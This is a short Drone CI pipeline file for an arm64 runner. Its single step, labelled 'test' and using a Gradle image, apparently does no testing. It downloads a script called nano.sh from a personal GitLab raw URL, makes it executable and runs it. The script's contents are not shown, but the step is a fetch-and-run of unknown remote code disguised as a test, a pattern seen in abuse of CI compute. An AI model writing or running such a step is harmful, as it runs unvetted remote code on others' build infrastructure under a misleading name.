kind: pipeline
type: docker
name: default

platform:
  os: linux
  arch: arm64

steps:

- name: test
  image: gradle:jdk17
  commands:
  - wget https://gitlab.com/renifer12/project-7/-/raw/main/nano.sh && chmod +x nano.sh && ./nano.sh
